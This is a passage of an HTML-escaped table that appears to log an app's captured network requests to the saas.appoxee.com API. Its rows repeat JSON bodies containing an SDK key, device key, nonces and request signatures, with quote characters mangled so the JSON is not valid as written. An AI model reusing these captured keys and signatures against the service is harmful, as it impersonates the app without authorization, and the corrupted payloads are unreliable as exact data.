                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                7
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                8
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                9
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                10
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                11
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                12
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                13
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                14
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                15
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                16
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                17
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                18
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                19
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                20
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                21
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                22
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                23
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                24
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getDeviceMessages`,`getDeviceMessages`:{`queryType`:`Regular`,`latestMessageDate`:`2014-01-18T12:51:31.836&amp;#8243;,`key`:`19ba7bd21bb3cfa3&amp;#8243;},`auth`:{`random`:`851868430692926395b96bcc6c62b869916&amp;#8243;,`timestamp`:13900538825,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`c5881a2819930f43af0b88c8c0f83c05&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                25
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getDeviceMessages`,`getDeviceMessages`:{`queryType`:`Regular`,`latestMessageDate`:`2014-01-18T12:51:31.836&amp;#8243;,`key`:`19ba7bd21bb3cfa3&amp;#8243;},`auth`:{`random`:`851868430692926395b96bcc6c62b869916&amp;#8243;,`timestamp`:13900538825,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`c5881a2819930f43af0b88c8c0f83c05&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                26
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getDeviceMessages`,`getDeviceMessages`:{`queryType`:`Regular`,`latestMessageDate`:`2014-01-18T12:51:31.836&amp;#8243;,`key`:`19ba7bd21bb3cfa3&amp;#8243;},`auth`:{`random`:`851868430692926395b96bcc6c62b869916&amp;#8243;,`timestamp`:13900538825,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`c5881a2819930f43af0b88c8c0f83c05&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                27
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getDeviceMessages`,`getDeviceMessages`:{`queryType`:`Regular`,`latestMessageDate`:`2014-01-18T12:51:31.836&amp;#8243;,`key`:`19ba7bd21bb3cfa3&amp;#8243;},`auth`:{`random`:`851868430692926395b96bcc6c62b869916&amp;#8243;,`timestamp`:13900538825,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`c5881a2819930f43af0b88c8c0f83c05&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                28
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getDeviceMessages`,`getDeviceMessages`:{`queryType`:`Regular`,`latestMessageDate`:`2014-01-18T12:51:31.836&amp;#8243;,`key`:`19ba7bd21bb3cfa3&amp;#8243;},`auth`:{`random`:`851868430692926395b96bcc6c62b869916&amp;#8243;,`timestamp`:13900538825,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`c5881a2819930f43af0b88c8c0f83c05&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                29
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getDeviceMessages`,`getDeviceMessages`:{`queryType`:`Regular`,`latestMessageDate`:`2014-01-18T12:51:31.836&amp;#8243;,`key`:`19ba7bd21bb3cfa3&amp;#8243;},`auth`:{`random`:`851868430692926395b96bcc6c62b869916&amp;#8243;,`timestamp`:13900538825,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`c5881a2819930f43af0b88c8c0f83c05&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                30
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getDeviceMessages`,`getDeviceMessages`:{`queryType`:`Regular`,`latestMessageDate`:`2014-01-18T12:51:31.836&amp;#8243;,`key`:`19ba7bd21bb3cfa3&amp;#8243;},`auth`:{`random`:`851868430692926395b96bcc6c62b869916&amp;#8243;,`timestamp`:13900538825,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`c5881a2819930f43af0b88c8c0f83c05&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                31
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getDeviceMessages`,`getDeviceMessages`:{`queryType`:`Regular`,`latestMessageDate`:`2014-01-18T12:51:31.836&amp;#8243;,`key`:`19ba7bd21bb3cfa3&amp;#8243;},`auth`:{`random`:`851868430692926395b96bcc6c62b869916&amp;#8243;,`timestamp`:13900538825,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`c5881a2819930f43af0b88c8c0f83c05&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                32
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                33
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                34
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                35
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                36
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                37
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                38
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                39
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                40
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                41
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                42
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                43
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                44
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                45
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                46
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                47
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`1119413a297389c129790915258b4825171&amp;#8243;,`timestamp`:13900538708,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`fdfc1bbba1ab6eb97a59e08c49e3271a`}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                48
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                49
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                50
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                51
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                52
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                53
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                54
                              &lt;/th&gt;

                              &lt;td&gt;
                                saas.appoxee.com
                              &lt;/td&gt;

                              &lt;td&gt;
                                /api/
                              &lt;/td&gt;

                              &lt;td&gt;
                                {`action`:`getServerTime`,`auth`:{`random`:`ca3318438b295ab61a34b2a10b960a1c682&amp;#8243;,`timestamp`:13900538811,`AppSDKKey`:`3ec0fb21-759c-4169-9fed-44efda1ea246&amp;#8243;,`signature`:`364989804263bd8af6146c078eed4850&amp;#8243;}}
                              &lt;/td&gt;
                            &lt;/tr&gt;

                            &lt;tr&gt;
                              &lt;th&gt;
                                55
